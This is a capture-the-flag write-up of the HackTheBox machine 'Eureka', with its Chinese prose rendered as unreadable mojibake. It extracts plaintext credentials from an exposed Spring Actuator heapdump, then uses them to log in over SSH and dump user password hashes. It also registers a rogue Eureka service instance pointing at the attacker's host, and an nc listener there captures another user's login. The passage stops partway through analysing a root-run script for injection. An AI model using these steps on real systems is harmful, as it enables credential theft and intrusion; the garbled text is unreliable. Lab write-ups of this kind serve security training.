http://furni.htb/actuator/env\n```\n\nèƒ½å‘ç°ç½‘ç«™æ ¹ç›®å½•ï¼š`/var/www/web/Furni`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image3.png)\n\nå¹¶ä¸”ç›®å½•æ‰«æä¸­è¿˜ä»æ‰«æå‡ºæ¥äº† `/actuator/heapdump` ï¼ˆ`Heap dump` ä¸ºæ¸—é€æµ‹è¯•è€…æä¾›äº†å¯¹å†…å­˜ä¸­æ‰€æœ‰å¯¹è±¡çš„å¯è§†åŒ–è®¿é—®ï¼Œæ˜¯å‘ç°å’ŒéªŒè¯æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€ä¸šåŠ¡é€»è¾‘ç¼ºé™·åŠå†…å­˜ç ´åæ¼æ´çš„é‡è¦æ‰‹æ®µã€‚ï¼‰\n\n```bash\n[03:08:56] 200 -   76MB - /actuator/heapdump\n```\n\n```bash\nâœ  Eureka curl http://furni.htb/actuator/heapdump --output heapdump \n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100 76.4M  100 76.4M    0     0  1472k      0  0:00:53  0:00:53 --:--:--  477k\n```\n\nä½¿ç”¨ å·¥å…·å¯¹å…¶è¿›è¡Œåˆ†æ\n\n```bash\nâœ  Eureka java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump                                                                                                                                                                      \nPicked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true                                                                                                                                                       \n===========================================                                                                                                                                                                                         \nSpringDataSourceProperties\n-------------\npassword = 0sc@r190_S0l!dP@sswd\ndriverClassName = com.mysql.cj.jdbc.Driver\nurl = jdbc:mysql://localhost:3306/Furni_WebApp_DB\nusername = oscar190\n===========================================\nHikariDataSource\n-------------\njava.lang.NumberFormatException: Cannot parse null string \n===========================================\nOriginTrackedMapPropertySource\n-------------                  \nmanagement.endpoints.web.exposure.include = *\nspring.datasource.driver-class-name = com.mysql.cj.jdbc.Driver\nspring.cloud.inetutils.ignoredInterfaces = enp0s.*\neureka.client.service-url.defaultZone = http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/\nserver.forward-headers-strategy = native   \nspring.datasource.url = jdbc:mysql://localhost:3306/Furni_WebApp_DB\nspring.application.name = Furni\nserver.port = 8082\nspring.jpa.properties.hibernate.format_sql = true\nspring.session.store-type = jdbc           \nspring.jpa.hibernate.ddl-auto = none\n-------------                                                \nUserPassSearcher                           \n.... many Message ....\n```\n\nå–‚ç»™GPTä¸Šè¿›è¡Œåˆ†æï¼Œå…¶ä¸­æœ€å…³é”®çš„ä¿¡æ¯æ˜¯ï¼š\n\n```bash\nusername = oscar190  \npassword = 0sc@r190_S0l!dP@sswd  \nurl      = jdbc:mysql://localhost:3306/Furni_WebApp_DB  \n```\n\n| é…ç½®é¡¹ | å«ä¹‰ | å®‰å…¨å½±å“ï¼é£é™© |\n| --- | --- | --- |\n| `management.endpoints.web.exposure.include = *` | Actuator æš´éœ²æ‰€æœ‰ç®¡ç†ç«¯ç‚¹ï¼ˆåŒ…æ‹¬ `/heapdump`, `/env`, `/beans` ç­‰ï¼‰ | **é«˜å±**ï¼šæ”»å‡»è€…å¯è®¿é—®ä»»æ„ç®¡ç†ç«¯ç‚¹ï¼Œä¸‹è½½å †å¿«ç…§ã€æŸ¥çœ‹ç¯å¢ƒå˜é‡ã€åŠ¨æ€ä¿®æ”¹æ—¥å¿—çº§åˆ«ï¼Œç”šè‡³æ‰§è¡Œæ•æ„Ÿæ“ä½œã€‚ |\n| `spring.datasource.driver-class-name = com.mysql.cj.jdbc.Driver` | JDBC é©±åŠ¨ç±»ï¼Œä½¿ç”¨ MySQL Connector/J | æ— ç›´æ¥é£é™©ï¼Œä½†è¡¨æ˜åç»­ URLã€å‡­æ®å¯ç”¨äº MySQL è¿æ¥ã€‚ |\n| `spring.cloud.inetutils.ignoredInterfaces = enp0s.*` | Spring Cloud InetUtils å¿½ç•¥ä»¥ `enp0s.*` å‘½åçš„ç½‘ç»œæ¥å£ | è¾ƒä½é£é™©ï¼›å½±å“æœåŠ¡æ³¨å†Œæ—¶è®°å½•çš„ IPï¼Œä¸å®é™…å¯è¾¾ IP å¯èƒ½ä¸ä¸€è‡´ã€‚ |\n| `eureka.client.service-url.defaultZone = http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/` | Eureka å®¢æˆ·ç«¯æ³¨å†Œä¸­å¿ƒåœ°å€ï¼ŒåŒ…å«æ˜æ–‡ç”¨æˆ·åå’Œå¯†ç  | **é«˜å±**ï¼šå¯æŸ¥è¯¢/ä¸‹çº¿å…¶ä»–å¾®æœåŠ¡å®ä¾‹ï¼Œç ´åæœåŠ¡å¯ç”¨æ€§æˆ–çªƒå–æ›´å¤šé…ç½®ä¿¡æ¯ã€‚ |\n| `server.forward-headers-strategy = native` | ä»£ç†ç¯å¢ƒä¸‹è½¬å‘ HTTP å¤´ï¼ˆå¦‚ X-Forwarded-*ï¼‰ | è¾ƒä½é£é™©ï¼›å¯èƒ½å½±å“æ—¥å¿—ä¸­è®°å½•çš„çœŸå®å®¢æˆ·ç«¯ IPï¼Œä½†å¯¹æ¸—é€ä»·å€¼æœ‰é™ã€‚ |\n| `spring.datasource.url = jdbc:mysql://localhost:3306/Furni_WebApp_DB` | JDBC è¿æ¥ URLï¼ŒæŒ‡å‘æœ¬åœ° MySQL æ•°æ®åº“ | å·²ç»“åˆå‡­æ®å¯ç›´æ¥è¿æ¥æ•°æ®åº“ï¼Œè‹¥æ•°æ®åº“å…è®¸è¿è¡Œå¤–éƒ¨è¿æ¥ï¼Œå¯è¿œç¨‹åˆ©ç”¨ã€‚ |\n| `spring.application.name = Furni` | åº”ç”¨åœ¨ Eureka æˆ–å…¶ä»–æ³¨å†Œä¸­å¿ƒä¸­çš„åç§° | ä½é£é™©ï¼›å¯ç”¨äºè¯†åˆ«æœåŠ¡æ‹“æ‰‘ï¼Œä½†å¯¹æ”»å‡»æ— ç›´æ¥å¸®åŠ©ã€‚ |\n| `server.port = 8082` | åº”ç”¨ç›‘å¬çš„ HTTP ç«¯å£ | æ­ç¤ºå¯è®¿é—®çš„ç«¯å£ï¼Œæ¸—é€æµ‹è¯•æ—¶å¯é’ˆå¯¹è¯¥ç«¯å£è¿›è¡Œæ¢æµ‹ä¸æ”»å‡»ã€‚ |\n| `spring.jpa.properties.hibernate.format_sql = true` | Hibernate æ‰“å° SQL æ—¶æ ¼å¼åŒ–è¾“å‡º | ä½é£é™©ï¼›ä»…å½±å“æ—¥å¿—å¯è¯»æ€§ï¼Œæ— å®‰å…¨å½±å“ã€‚ |\n| `spring.session.store-type = jdbc` | Spring Session å­˜å‚¨ç­–ç•¥ï¼Œè¡¨ç¤ºä¼šè¯æ•°æ®å­˜å…¥æ•°æ®åº“ | ä¸­ç­‰é£é™©ï¼šä¼šè¯ä¿¡æ¯ã€Session ID å­˜åº“ï¼Œæ”»å‡»è€…å¯å°è¯•è¯»å–æˆ–ç¯¡æ”¹ä¼šè¯è¡¨ä»¥è¿›è¡Œä¼šè¯å›ºå®šæˆ–åŠ«æŒã€‚ |\n| `spring.jpa.hibernate.ddl-auto = none` | Hibernate ä¸ä¼šè‡ªåŠ¨åˆ›å»ºã€æ›´æ–°æˆ–éªŒè¯æ•°æ®åº“ç»“æ„ | ä½é£é™©ï¼›è¡¨ç¤ºåº”ç”¨ä¸ä¼šä¿®æ”¹è¡¨ç»“æ„ã€‚ |\n\n### Spring Eureka\n\nSpring Eureka æ˜¯ä¸€ä¸ªæœåŠ¡æ³¨å†Œä¸­å¿ƒï¼Œæ˜¯ç”¨æ¥å®ç°å¾®æœåŠ¡ä¹‹é—´**è‡ªåŠ¨æ³¨å†Œå’Œå‘ç°**çš„å·¥å…·\n\nåˆ†æä¸­å‘ç°ï¼Œè´¦å·å¯†ç ä¹Ÿå±•ç¤ºå‡ºæ¥äº† `EurekaSrvr:0scarPWDisTheB3st`\n\n| `eureka.client.service-url.defaultZone = http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/` | Eureka å®¢æˆ·ç«¯æ³¨å†Œä¸­å¿ƒåœ°å€ï¼ŒåŒ…å«æ˜æ–‡ç”¨æˆ·åå’Œå¯†ç  | **é«˜å±**ï¼šå¯æŸ¥è¯¢/ä¸‹çº¿å…¶ä»–å¾®æœåŠ¡å®ä¾‹ï¼Œç ´åæœåŠ¡å¯ç”¨æ€§æˆ–çªƒå–æ›´å¤šé…ç½®ä¿¡æ¯ã€‚ |\n| --- | --- | --- |\n\nèƒ½å‘ç°æœåŠ¡å™¨åœ¨å¥½å‡ ä¸ªç«¯å£è¿è¡Œç€æœåŠ¡\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image4.png)\n\n## ææƒ - To Miranda\n\n### ä¿¡æ¯æ”¶é›†\n\nä¹‹å‰ä¸Šé¢è¿˜å‘ç°å‘¢ä¸€ç»„è´¦å·å¯†ç `oscar190:0sc@r190_S0l!dP@sswd`\n\nå°è¯• SSH ç™»å½•ï¼Œå‘ç°æˆåŠŸäº†\n\n```bash\nâœ  Eureka ssh oscar190@10.10.11.66\nThe authenticity of host '10.10.11.66 (10.10.11.66)' can't be established.\nED25519 key fingerprint is SHA256:5/rCExVFUnFdG5UFLnW7ExQuyelBwtSqwHzBiWKqza0.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.11.66' (ED25519) to the list of known hosts.\noscar190@10.10.11.66's password: \n\nLast login: Sun Apr 27 07:31:27 2025 from 10.10.16.59\noscar190@eureka:~$ \n```\n\nç”¨æˆ·ä¿¡æ¯\n\n```bash\noscar190@eureka:/home$ ls\nmiranda-wise  oscar190\n```\n\nç›‘å¬çš„ç«¯å£\n\n```bash\noscar190@eureka:~$ ss -tulpn\nNetid                 State                   Recv-Q                  Send-Q                                        Local Address:Port                                    Peer Address:Port                 Process                 \nudp                   UNCONN                  0                       0                                             127.0.0.53%lo:53                                           0.0.0.0:*                                            \nudp                   UNCONN                  0                       0                                                         *:37093                                              *:*                                            \nudp                   UNCONN                  0                       0                                                         *:49730                                              *:*                                            \nudp                   UNCONN                  0                       0                                                         *:52181                                              *:*                                            \nudp                   UNCONN                  0                       0                                                         *:36551                                              *:*                                            \ntcp                   LISTEN                  0                       511                                                 0.0.0.0:80                                           0.0.0.0:*                                            \ntcp                   LISTEN                  0                       4096                                          127.0.0.53%lo:53                                           0.0.0.0:*                                            \ntcp                   LISTEN                  0                       128                                                 0.0.0.0:22                                           0.0.0.0:*                                            \ntcp                   LISTEN                  0                       80                                                127.0.0.1:3306                                         0.0.0.0:*                                            \ntcp                   LISTEN                  0                       4096                                     [::ffff:127.0.0.1]:8080                                               *:*                                            \ntcp                   LISTEN                  0                       511                                                    [::]:80                                              [::]:*                                            \ntcp                   LISTEN                  0                       100                                      [::ffff:127.0.0.1]:8081                                               *:*                                            \ntcp                   LISTEN                  0                       100                                      [::ffff:127.0.0.1]:8082                                               *:*                                            \ntcp                   LISTEN                  0                       128                                                    [::]:22                                              [::]:*                                            \ntcp                   LISTEN                  0                       100                                                       *:8761                                               *:*  \n```\n\nç»“åˆä¹‹å‰çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬å»è®¿é—®ä¸€ä¸‹æ•°æ®åº“\n\n```bash\nusername = oscar190  \npassword = 0sc@r190_S0l!dP@sswd  \nurl      = jdbc:mysql://localhost:3306/Furni_WebApp_DB  \n```\n\n```bash\noscar190@eureka:/home$ mysql -uoscar190 -p\nEnter password: \nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection id is 400\nServer version: 10.3.39-MariaDB-0ubuntu0.20.04.2 Ubuntu 20.04\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nMariaDB [(none)]> \n```\n\n```bash\nariaDB [Furni_WebApp_DB]> select * from SPRING_SESSION;                                                                                                                                                                            \n+--------------------------------------+--------------------------------------+---------------+------------------+-----------------------+---------------+------------------------+                                                 \n| PRIMARY_ID                           | SESSION_ID                           | CREATION_TIME | LAST_ACCESS_TIME | MAX_INACTIVE_INTERVAL | EXPIRY_TIME   | PRINCIPAL_NAME         |                                                 \n+--------------------------------------+--------------------------------------+---------------+------------------+-----------------------+---------------+------------------------+ \n| 10233918-ae1b-42fb-be6f-5f9964cf1bd4 | 4e178510-cbab-422a-9aec-2d220d4aac84 | 1745739662223 |    1745739664438 |                  1800 | 1745741464438 | miranda.wise@furni.htb |                                                 \n| 13332183-199d-4684-ada9-cb6d4a369d3d | 291a60aa-1a92-4f7b-b46e-b2050b972752 | 1745739481031 |    1745739481182 |                  1800 | 1745741281182 | miranda.wise@furni.htb |  \n| fa2e36a0-151d-486f-b2c3-0a620a9c21f5 | 19028783-c10e-44b3-9770-8e7137cde452 | 1745739541041 |    1745739541597 |                  1800 | 1745741341597 | miranda.wise@furni.htb |\n| fcbcfc2f-66a4-41c7-97cc-36cb09cf2e83 | 6dde7be1-48d9-4188-948b-947be5308ab6 | 1745739181290 |    1745739181563 |                  1800 | 1745740981563 | miranda.wise@furni.htb |\n```\n\n```bash\nMariaDB [Furni_WebApp_DB]> select * from users;\n+----+------------+-----------+-------------------------+--------------------------------------------------------------+----------+\n| id | first_name | last_name | email                   | password                                                     | is_staff |\n+----+------------+-----------+-------------------------+--------------------------------------------------------------+----------+\n|  2 | Kamel      | Mossab    | k.mossab110@eloquia.htb | $2a$10$J4yap5ZxviliZO9jBCuSdeD.7LzL3/njVpNhnG85HCcwA05ulUrzW |        0 |\n|  4 | Lorra      | Barker    | lorra199@gmail.com      | $2a$10$DgUDWpxipW2Yt7UcKxzvweB7FXoV/LFxlJG8yuL56NyUMMLr5uBuK |        0 |\n|  5 | Martin     | Wood      | mwood@gmail.com         | $2a$10$3LDYl5QEt4K4u8vLWMGH8eDA/fNKVquhHNbyijaDzzueKHAwi6bHO |        0 |\n|  8 | Roberto    | Dalton    | roberto0xd@outlook.com  | $2a$10$4TLCSlEfYrNDFfPDQ5z4p.S6gImA8NKAGn2tyqLJyG71l9iQoTDhu |        0 |\n|  9 | Miranda    | Wise      | miranda.wise@furni.htb  | $2a$10$T4L873JALnbXH10tq.mEbOOVYmZPLlBBSeD1h2hqAeX6nbTDXMyqm |        1 |\n| 10 | Oscar      | Dalton    | oscar190@furni.htb      | $2a$10$ye9a40a7KOyBJKUai2qxY.fcfVQGlFTM3SVSVcn82wxQf/2zYPq96 |        1 |\n| 11 | Nya        | Dalton    | nya190@furni.htb        | $2a$10$GZQOgzb4N1xVs3ALpnuqGeId5/mZLL8pv5GlkRzJfxdFxO/JIkIaK |        1 |\n| 12 | lucas      | carols    | logok12976@pelung.com   | $2a$10$J93xmU0.yP0/oZmoV9K4u.XvYHtl.kunSX9xoe2RACqKcitM4OjlC |        0 |\n| 15 | test       | test      | test@test.com           | $2a$10$KhEKRdaMX4axuvRkGw3wLuehQMBPMVlQ2astA3sR.toEjh63rbQWG |        0 |\n+----+------------+-----------+-------------------------+--------------------------------------------------------------+----------+\n9 rows in set (0.000 sec)\n```\n\nå°†å¯†ç æ”¾åå°è¿›è¡Œçˆ†ç ´\n\nç„¶åä¸Šä¼  `pspy64` ç›‘æµ‹ä¸€ä¸‹åå°ï¼Œå‘ç° `/opt/log_analyse.sh` å’Œ `/opt/scripts/miranda-Login-Simulator.sh` ä¸¤ä¸ªè„šæœ¬ï¼Œç¬¬äºŒä¸ªè„šæœ¬åº”è¯¥æ˜¯æ¨¡æ‹Ÿ`miranda`ç”¨æˆ·ç™»å½•Webç„¶ååœ¨æ•°æ®åº“ä¸­ç•™ä¸‹`SESSION`\n\n```bash\n2025/04/27 07:53:09 CMD: UID=0     PID=2026725 | /bin/bash /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log                                                                                                       \n2025/04/27 07:53:09 CMD: UID=0     PID=2026723 | /bin/bash /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log                                                                                                       \n2025/04/27 07:53:09 CMD: UID=1000  PID=2026682 | ./pspy64                                                                                                                                                                           \n2025/04/27 07:53:09 CMD: UID=0     PID=2026681 | curl http://furni.htb/login   -H Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8 -H Accept-Language: en-US,en;q=0.8 -H Cac\nhe-Control: max-age=0 -H Connection: keep-alive -H Content-Type: application/x-www-form-urlencoded -H Cookie: SESSION=YWQ0ZWE5YTAtODgzYi00ZGNjLWIyY2EtYjg0NTUxMTkxMTdm -H User-Agent: Mozilla/5.0 (X11; Linux x86_64) --data @/tmp/t\nmp.Wgy2TkeN8L --insecure -i                                                                                                                                                                                                         \n2025/04/27 07:53:09 CMD: UID=0     PID=2026601 | /bin/bash /opt/scripts/miranda-Login-Simulator.sh                                                                                                                                  \n2025/04/27 07:53:09 CMD: UID=0     PID=2026600 | /bin/sh -c /opt/scripts/miranda-Login-Simulator.sh  \n```\n\né‚£ä¹ˆå°±æ˜¯è¯´åœ¨ä¸€å®šæ—¶é—´ä¼šè¿è¡Œè¯¥è„šæœ¬ï¼Œå¹¶ä¸”æºå¸¦`miranda`çš„è´¦æˆ·å¯†ç å»è¿›è¡Œç™»å½•ã€‚\n\nç°åœ¨æˆ‘ä»¬åº”è¯¥å»é€šè¿‡æŸç§æ–¹å¼å»è·å¾—æ•°æ®åŒ…\n\n### Spring Eureka æˆªå–æµé‡\n\nä½¬ä»¬åˆ†äº«äº†ä¸€ç¯‡æ–‡ç« ï¼šhttps://medium.com/@mfocuz/hacking-netflix-eureka-8e5957b2f539\n\nå…¶ä¸­å°±æœ‰å…³äº**æµé‡åŠ«æŒ**çš„ï¼Œå¤§è‡´å°±æ˜¯ï¼šæ”»å‡»è€…å°†æ³¨å†ŒÂ ***webservice***Â å®ä¾‹å¹¶å°†å…¶æŒ‡å‘æ¶æ„æœåŠ¡å™¨ï¼Œæˆ–è€…æ›¿æ¢æ‰åŸæœ¬çš„å®ä¾‹ï¼Œåœ¨é¶æœºä¸­å¯èƒ½æ˜¯ **USER-MANAGEMENT-SERVICE**\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Eureka/image5.png)\n\nä» `heapdump` ä¸­å¯¼å‡ºçš„æ•°æ®ä¸­\n\n```bash\neureka.client.service-url.defaultZone = http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/\n```\n\nå¯ä»¥çŸ¥é“ Eureka Clientï¼Œé»˜è®¤è¦è¿æ¥çš„ Eureka Server åœ°å€æ˜¯ `http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/`ï¼Œè€Œä¸”è®¿é—®æ—¶è¦ç”¨è´¦å·å¯†ç è®¤è¯ã€‚\n\néœ€è¦ä½¿ç”¨æœ¬åœ°åœ°å€è¿›è¡Œè®¿é—®ï¼Œé‚£ä¹ˆå°±è¦ç”¨ `SSH` å°†ç«¯å£è½¬å‘å‡ºæ¥\n\n```bash\nssh -L 8761:localhost:8761 oscar190@10.10.11.66\n```\n\n`kali`ç›‘å¬ç«¯å£\n\n```bash\nâœ  Eureka nc -lvp 8081\nlistening on [any] 8081 ...\n```\n\nç„¶åæŸ¥çœ‹ `/eureka/apps/USER-MANAGEMENT-SERVICE` åŸæœ¬çš„å†…å®¹\n\n```bash\nâœ  Eureka curl 'http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE' -H \"Accept: application/json\"\n```\n\n```bash\n{\n  \"application\": {\n    \"name\": \"USER-MANAGEMENT-SERVICE\",\n    \"instance\": [\n      {\n        \"instanceId\": \"192.168.40.130:user-management-service:6969\",\n        \"hostName\": \"192.168.40.130\",\n        \"app\": \"USER-MANAGEMENT-SERVICE\",\n        \"ipAddr\": \"192.168.40.130\",\n        \"status\": \"UP\",\n        \"overriddenStatus\": \"UNKNOWN\",\n        \"port\": {\n          \"$\": 6969,\n          \"@enabled\": \"true\"\n        },\n        \"securePort\": {\n          \"$\": 9443,\n          \"@enabled\": \"false\"\n        },\n        \"countryId\": 1,\n        \"dataCenterInfo\": {\n          \"@class\": \"com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo\",\n          \"name\": \"MyOwn\"\n        },\n        \"leaseInfo\": {\n          \"renewalIntervalInSecs\": 30,\n          \"durationInSecs\": 90,\n          \"registrationTimestamp\": 1745749189827,\n          \"lastRenewalTimestamp\": 1745749189827,\n          \"evictionTimestamp\": 0,\n          \"serviceUpTimestamp\": 1745749189827\n        },\n        \"metadata\": {\n          \"zone\": \"default\",\n          \"management.port\": \"6969\"\n        },\n        \"homePageUrl\": \"http://192.168.40.130:6969/\",\n        \"statusPageUrl\": \"http://192.168.40.130:6969/info\",\n        \"healthCheckUrl\": \"http://192.168.40.130:6969/health\",\n        \"secureHealthCheckUrl\": \"\",\n        \"vipAddress\": \"user-management-service\",\n        \"secureVipAddress\": \"user-management-service\",\n        \"isCoordinatingDiscoveryServer\": \"false\",\n        \"lastUpdatedTimestamp\": \"1745749189827\",\n        \"lastDirtyTimestamp\": \"1745750384661\",\n        \"actionType\": \"ADDED\"\n      },\n      {\n        \"instanceId\": \"localhost:USER-MANAGEMENT-SERVICE:8081\",\n        \"hostName\": \"localhost\",\n        \"app\": \"USER-MANAGEMENT-SERVICE\",\n        \"ipAddr\": \"10.10.11.66\",\n        \"status\": \"UP\",\n        \"overriddenStatus\": \"UNKNOWN\",\n        \"port\": {\n          \"$\": 8081,\n          \"@enabled\": \"true\"\n        },\n        \"securePort\": {\n          \"$\": 443,\n          \"@enabled\": \"false\"\n        },\n        \"countryId\": 1,\n        \"dataCenterInfo\": {\n          \"@class\": \"com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo\",\n          \"name\": \"MyOwn\"\n        },\n        \"leaseInfo\": {\n          \"renewalIntervalInSecs\": 30,\n          \"durationInSecs\": 90,\n          \"registrationTimestamp\": 1745747961808,\n          \"lastRenewalTimestamp\": 1745755807954,\n          \"evictionTimestamp\": 0,\n          \"serviceUpTimestamp\": 1745747961808\n        },\n        \"metadata\": {\n          \"management.port\": \"8081\"\n        },\n        \"homePageUrl\": \"http://localhost:8081/\",\n        \"statusPageUrl\": \"http://localhost:8081/actuator/info\",\n        \"healthCheckUrl\": \"http://localhost:8081/actuator/health\",\n        \"vipAddress\": \"USER-MANAGEMENT-SERVICE\",\n        \"secureVipAddress\": \"USER-MANAGEMENT-SERVICE\",\n        \"isCoordinatingDiscoveryServer\": \"false\",\n        \"lastUpdatedTimestamp\": \"1745747961808\",\n        \"lastDirtyTimestamp\": \"1745747961026\",\n        \"actionType\": \"ADDED\"\n      }\n    ]\n  }\n}\n\n```\n\næ„é€ æ¶æ„æ•°æ®åŒ…ï¼Œä¸éœ€è¦å…¨éƒ¨éƒ½æ·»åŠ ï¼Œæ…¢æ…¢æµ‹è¯•å³å¯\n\n```bash\ncurl 'http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE' -H 'Content-Type: application/json' -d '{\n  \"instance\": {\n\t  \"hostName\": \"10.10.16.59\",\n    \"instanceId\": \"USER-MANAGEMENT-SERVICE\",\n    \"app\": \"USER-MANAGEMENT-SERVICE\",\n    \"ipAddr\": \"10.10.16.59\",\n    \"vipAddress\": \"USER-MANAGEMENT-SERVICE\",\n    \"secureVipAddress\": \"USER-MANAGEMENT-SERVICE\",\n    \"dataCenterInfo\": {\n      \"@class\": \"com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo\",\n      \"name\": \"MyOwn\"\n    },\n    \"status\": \"UP\",\n    \"port\": {\n      \"$\": 8081,\n      \"@enabled\": \"true\"\n    }\n  }\n}'\n```\n\nç„¶åæˆ‘ä»¬çš„ç«¯å£å°±ä¼šæ•è·åˆ°æ•°æ®åŒ…\n\n```bash\nâœ  Eureka nc -lvp 8081\nlistening on [any] 8081 ...\nconnect to [10.10.16.59] from eureka.htb [10.10.11.66] 43346\nPOST /login HTTP/1.1\nX-Real-IP: 127.0.0.1\nX-Forwarded-For: 127.0.0.1,127.0.0.1\nX-Forwarded-Proto: http,http\nContent-Length: 168\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\nAccept-Language: en-US,en;q=0.8\nCache-Control: max-age=0\nContent-Type: application/x-www-form-urlencoded\nCookie: SESSION=ZjljOWMxOTctMWMyNS00YThkLThlNzItM2RhMDcxYTdkOTk3\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64)\nForwarded: proto=http;host=furni.htb;for=\"127.0.0.1:45412\"\nX-Forwarded-Port: 80\nX-Forwarded-Host: furni.htb\nhost: 10.10.16.59:8081\n\nusername=miranda.wise%40furni.htb&password=IL%21veT0Be%26BeT0L0ve&_csrf=IcxoURYl9qB2QGXTrE_ozcieiecjjQ056cY7bHQ7wAynOgBAFv9bMicVwZBbclLqlGLc9P74pN9HvDUUi6ADDxcO-DTEXjEk\n```\n\nå¾—åˆ° `miranda` çš„è´¦å·å¯†ç \n\n```bash\nusername=miranda.wise@furni.htb&password=IL!veT0Be&BeT0L0ve\n```\n\n`SSH` ç™»å½•\n\n```bash\nâœ  Eureka ssh miranda-wise@10.10.11.66\nmiranda-wise@10.10.11.66's password: \nLast login: Sun Apr 27 12:40:29 2025 from 10.10.16.59\nmiranda-wise@eureka:~$ \n```\n\næ‹¿åˆ° user.txt\n\n```\ncat user.txt\n1c0182b3b229fff1f28a469053a94c36\n```\n\n## ææƒ\n\n### ä¿¡æ¯æ”¶é›†\n\nä½¿ç”¨äº† Linpeas.sh è¿›è¡Œæ”¶é›†åï¼Œæ²¡æ‰¾åˆ°ä»€ä¹ˆæœ‰è¶£çš„ä¿¡æ¯\n\n```bash\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£ Basic information â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n                               â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nOS: Linux version 5.4.0-214-generic (buildd@lcy02-amd64-062) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #234-Ubuntu SMP Fri Mar 14 23:50:27 UTC 2025\nUser & Groups: uid=1001(miranda-wise) gid=1002(miranda-wise) groups=1002(miranda-wise),1003(developers)\nHostname: eureka\n```\n\n### è„šæœ¬åˆ†æ\n\nåˆå›åˆ°ä¹‹å‰çš„è„šæœ¬å¤„ï¼Œæƒ³èµ·æ¥ä½¿ç”¨ `pspy64` è¿›è¡Œæ£€æµ‹çš„æ—¶å€™è¿˜æœ‰å¦å¤–ä¸€ä¸ªè„šæœ¬\n\n```bash\n2025/04/28 05:00:41 CMD: UID=0     PID=2047217 | /bin/bash /opt/log_analyse.sh /var/www/web/user-management-service/log/application.log \n```\n\næ˜¯ä»¥ `root` èº«ä»½è¿è¡Œçš„ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯¹ `/var/www/web/user-management-service` ç›®å½•æœ‰åˆ é™¤çš„æƒé™ï¼Œä½†æ˜¯å¯¹ `application.log` æ²¡æœ‰å†™çš„æƒé™ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ é™¤äº†æ—¥å¿—æ–‡ä»¶åå†åˆ›å»ºä¸€ä¸ªï¼Œæˆ‘ä»¬å°±æœ‰å†™æƒé™äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ç°åœ¨è¦æ‰¾åˆ°è„šæœ¬ä¸­æ˜¯å¦å­˜åœ¨å‘½ä»¤æ³¨å…¥\n\n```bash\nâ•”â•â•â•â•â•â•â•â•â•â•â•£ Interesting GROUP writable files (not in Home) (max 200)\nâ•š https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files\n  Group developers:\n/var/www/web    \n/var/www/web/user-management-service\n/var/www/web/user-management-service/target \n```\n\nåˆ†æè„šæœ¬ï¼ˆå–‚ç»™ `GPT`ï¼‰\n\n```bash\n#!/bin/bash\n\n# é¢œè‰²å®šä¹‰ï¼Œç”¨äºè¾“å‡ºå½©è‰²ä¿¡æ¯\nGREEN='\\033[0;32m'      # ç»¿è‰²ï¼Œç”¨äºæˆåŠŸæ¶ˆæ¯\nRED='\\033[0;31m'        # çº¢è‰²ï¼Œç”¨äºé”™è¯¯æ¶ˆæ¯\nYELLOW='\\033[1;33m'     # é»„è‰²ï¼Œç”¨äºè­¦å‘Šæ¶ˆæ¯\nBLUE='\\033[0;34m'       # è“è‰²ï¼Œç”¨äºä¿¡æ¯æ¶ˆæ¯\nCYAN='\\033[0;36m'       # é’è‰²ï¼Œç”¨äºä¸€èˆ¬ä¿¡æ¯\nRESET='\\033[0m'         # é‡ç½®é¢œè‰²ï¼Œæ¢å¤é»˜è®¤é¢œè‰²\n\n# å®šä¹‰æ—¥å¿—æ–‡ä»¶å’Œè¾“å‡ºæ–‡ä»¶\nLOG_FILE=\"$1\"           # ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ—¥å¿—æ–‡ä»¶çš„è·¯å¾„\nOUTPUT_FILE=\"log_analysis.txt\"  # è¾“å‡ºæ–‡ä»¶ï¼Œä¿å­˜åˆ†æç»“æœ\n\n# å£°æ˜å…³è”æ•°ç»„ï¼Œç”¨äºå­˜å‚¨ç™»å½•è®¡æ•°\ndeclare -A successful_users  # 